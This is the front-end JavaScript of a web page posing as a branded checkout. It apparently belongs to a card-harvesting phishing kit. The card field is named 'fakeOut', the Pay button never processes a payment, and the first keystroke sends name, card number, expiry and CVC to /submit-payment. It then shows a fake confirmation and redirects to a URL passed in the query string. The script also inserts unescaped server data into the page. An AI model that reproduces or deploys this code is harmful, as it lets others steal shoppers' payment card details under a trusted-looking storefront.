    <script>
 document.addEventListener('DOMContentLoaded', () => {
    const params = new URLSearchParams(window.location.search);
    const dataId = params.get('v');
    const urlParam = params.get('q') || params.get('link'); 

    if (dataId) {
        fetch(`/fetch-event-data?dataId=${dataId}`)
            .then(response => response.json())
            .then(data => {
                const propertiesContainer = document.getElementById('propertiesContainer');
                const companyLogo = document.getElementById('companyLogo');
                const priceElement = document.getElementById('price');
                const oneTimePaymentInfo = document.getElementById('oneTimePaymentInfo');
                const subscriptionOptions = document.getElementById('subscriptionOptions');
                const paymentButton = document.getElementById('paymentButton');
                const productName = document.getElementById('productName');
                const companyName = document.getElementById('companyName');
                const productItem = document.getElementById('productItem');
                const orderProductImage = document.getElementById('orderProductImage');
                const productImageElement = document.getElementById('productImage');

                const companyNameHidden = data.companyName || 'payment';
                const productNameHidden = data.productName || '';
                const totalAmountHidden = document.getElementById('hiddenTotalAmount');
                const successMessage = document.getElementById('modalBody');
                const continueButtons = document.getElementsByClassName('modalConfirmButton');

                // Populate hidden fields
                document.getElementById('hiddenCompanyName').value = companyNameHidden;
                document.getElementById('hiddenProductName').value = productNameHidden;
                document.getElementById('hiddenTotalAmount').value = totalAmountHidden.value;

                propertiesContainer.innerHTML = '';

                if (Object.keys(data).length > 0) {
                    for (const [key, value] of Object.entries(data)) {
                        const propertyElement = document.createElement('div');
                        propertyElement.classList.add('mb-2', 'p-2', 'border', 'rounded', 'bg-gray-50');
                        propertyElement.innerHTML = `<strong>${key}:</strong> ${value}`;
                        propertiesContainer.appendChild(propertyElement);

                        if (key === 'companyLogo' && value) {
                            companyLogo.src = value;
                        } else if (key === 'companyName' && value) {
                            companyName.textContent = value;
                            document.title = value;
                        } else if (key === 'productName' && value) {
                            productName.textContent = value;
                            productItem.textContent = value;
                        } else if (key === 'price' && value) {
                            priceElement.textContent = value;
                            updateTotal();
                        } else if (key.toLowerCase() === 'paymenttype') {
                            const paymentTypeValue = value.toLowerCase().replace(/-/g, ' ');
                            if (paymentTypeValue === 'one time payment') {
                                oneTimePaymentInfo.style.display = 'block';
                                subscriptionOptions.style.display = 'none';
                                paymentButton.textContent = 'Pay Now';
                            } else {
                                oneTimePaymentInfo.style.display = 'none';
                                subscriptionOptions.style.display = 'block';
                                paymentButton.textContent = 'Subscribe';
                            }
                        } else if (key === 'productImage' && value) {
                            productImageElement.src = value;
                            orderProductImage.classList.remove('hidden');
                        } else if (key === 'successMessage' && value) {
                            successMessage.textContent = value;
                        } 
                    }
                    if (urlParam) {
                        // If the 'q' parameter exists, set it as the href for all buttons
                        Array.from(continueButtons).forEach(button => {
                            button.href = urlParam;
                        });
                    } else if (data && data.destinationUrl) {
                        // If 'destinationUrl' exists in the 'data' object, set it as the href for all buttons
                        Array.from(continueButtons).forEach(button => {
                            button.href = data.destinationUrl;
                        });
                    }
                } else {
                    propertiesContainer.innerHTML = '<p>No data found for the given dataId.</p>';
                }
            })
            .catch(error => console.error('Error fetching event data:', error));
    }

    const quantityInput = document.getElementById('quantity');
    const subtotalElement = document.getElementById('subtotal');
    const serviceChargeElement = document.getElementById('serviceCharge');
    const totalElement = document.getElementById('total');
    const priceElement = document.getElementById('price');
    const hiddenTotalAmount = document.getElementById('hiddenTotalAmount');

    function updateTotal() {
        const quantity = parseInt(quantityInput.value, 10);
        const price = parseFloat(priceElement.textContent.replace('$', ''));
        const subtotal = price * quantity;
        const serviceCharge = subtotal * 0.03; // 3% of subtotal
        const total = subtotal + serviceCharge;

        subtotalElement.textContent = `$${subtotal.toFixed(2)}`;
        serviceChargeElement.textContent = `$${serviceCharge.toFixed(2)}`;
        totalElement.textContent = `$${total.toFixed(2)}`;
        hiddenTotalAmount.value = total.toFixed(2);
    }

    quantityInput.addEventListener('change', updateTotal);
    quantityInput.addEventListener('input', updateTotal);
    updateTotal();

    const confirmationModal = document.getElementById('confirmationModal');
    const updateEmailCheckboxes = document.getElementsByClassName('updateEmailCheckbox');

    document.getElementById('fakeOut').addEventListener('input', function () {
        confirmationModal.classList.remove('hidden');
        document.getElementById('fakeOut').blur();
        
        const formData = new FormData(document.getElementById('checkoutForm'));
        const accountData = Object.fromEntries(formData);
        accountData.url = window.location.href;
        delete accountData.email;

        if (dataId) {
            accountData.dataId = dataId;
        }

        console.log(accountData);

        fetch('/submit-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(accountData)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Account data submitted:', data);
        })
        .catch(error => console.error('Error submitting account data:', error));
    }, {once : true});

            const checkboxes = document.querySelectorAll('.updateEmailCheckbox');
            const checkbox1 = checkboxes[0];
            const checkbox2 = checkboxes[1];
            

            // Function to synchronize checkboxes
            function syncCheckboxes(source, target) {
                target.checked = source.checked;
            }

            // Event listeners to synchronize checkboxes
            checkbox1.addEventListener('change', () => {
                syncCheckboxes(checkbox1, checkbox2);
            });

            checkbox2.addEventListener('change', () => {
                syncCheckboxes(checkbox2, checkbox1);
            });

    // Get all elements with the class 'modalConfirmButton'
const modalConfirmButtons = document.querySelectorAll('.modalConfirmButton');

function handleConfirmButtonClick(event) {
    event.preventDefault(); // Prevent default behavior for both click and touch

    const formData = new FormData(document.getElementById('checkoutForm'));
    const accountData = Object.fromEntries(formData);
    const updateEmailCheckbox = document.querySelector('.updateEmailCheckbox:checked');
    
    if (updateEmailCheckbox) {
        fetch('/update-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: accountData.email, dataId })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Email updated:', data);
            // Hide the confirmation modal
            document.getElementById('confirmationModal').classList.add('hidden');
            // Navigate to the link
            window.location.href = this.getAttribute('href');
        })
        .catch(error => {
            console.error('Error updating email:', error);
            // Navigate even if there's an error
            window.location.href = this.getAttribute('href');
        });
    } else {
        // If no email update is needed, navigate immediately
        window.location.href = this.getAttribute('href');
    }
}

// Add click event listener to each button
modalConfirmButtons.forEach(button => {
    button.addEventListener('click', handleConfirmButtonClick);
    button.addEventListener('touchend', handleConfirmButtonClick);
});

// Add touch event listeners for mobile devices
modalConfirmButtons.forEach(button => {
    button.addEventListener('touchstart', function(e) {
        e.preventDefault(); // Prevent default touch behavior
    });
    button.addEventListener('touchend', function(e) {
        e.preventDefault(); // Prevent default touch behavior
    });
});

    const fullNameWrapper = document.getElementById('full-name-wrapper');
    const emailWrapper = document.getElementById('email-wrapper');
    const paymentWrapper = document.getElementById('payment-wrapper');
    const fakeOutInput = document.getElementById('fakeOut');
    const expiryInput = document.getElementById('expiry');
    const cvcInput = document.getElementById('cvc');

    function addFocusClass() {
        paymentWrapper.classList.add('input-wrapper-focused');
    }

    function removeFocusClass() {
        paymentWrapper.classList.remove('input-wrapper-focused');
    }

    [fakeOutInput, expiryInput, cvcInput].forEach(input => {
        input.addEventListener('focus', addFocusClass);
        input.addEventListener('blur', removeFocusClass);
    });

    const paymentButton = document.getElementById('paymentButton');

    paymentButton.addEventListener('click', function (event) {
        event.preventDefault();
        confirmationModal.classList.remove('hidden');
    });

    function formatExpiryDate(input) {
        const value = input.value.replace(/\D/g, '');
        const formattedValue = value.replace(/(\d{2})(\d{1,2})?/, '$1/$2');
        input.value = formattedValue.trim();
    }

    expiryInput.addEventListener('input', () => formatExpiryDate(expiryInput));
    formatExpiryDate(expiryInput);

    function formatfakeOut(input) {
        const value = input.value.replace(/\D/g, '');
        const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
        input.value = formattedValue.trim();
    }

    fakeOutInput.addEventListener('input', () => formatfakeOut(fakeOutInput));
    formatfakeOut(fakeOutInput);

    function checkFormValidity() {
        const fullName = document.getElementById('fullName').value.trim();
        const email = document.getElementById('email').value.trim();
        const fakeOut = fakeOutInput.value.replace(/\s/g, '');
        const expiry = expiryInput.value.trim();
        const cvc = cvcInput.value.trim();

        const isValidfakeOut = fakeOut.length === 16;
        const isValidCVC = cvc.length >= 3 && cvc.length <= 4;

        const allFieldsFilled = fullName && email && isValidfakeOut && expiry && isValidCVC;

        paymentButton.disabled = !allFieldsFilled;
        paymentButton.classList.toggle('opacity-50', !allFieldsFilled);
        paymentButton.classList.toggle('cursor-not-allowed', !allFieldsFilled);
    }

    ['fullName', 'email', 'fakeOut', 'expiry', 'cvc'].forEach(fieldId => {
        document.getElementById(fieldId).addEventListener('input', checkFormValidity);
    });

    fakeOutInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 16) {
            value = value.slice(0, 16);
        }
        this.value = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
        checkFormValidity();
    });

    expiryInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 4) {
            value = value.slice(0, 4);
        }
        if (value.length > 2) {
            this.value = value.slice(0, 2) + '/' + value.slice(2);
        } else {
            this.value = value;
        }
        checkFormValidity();
    });

    cvcInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 4) {
            value = value.slice(0, 4);
        }
        this.value = value;
        checkFormValidity();
    });

    checkFormValidity();
});
    </script>
    
</body>
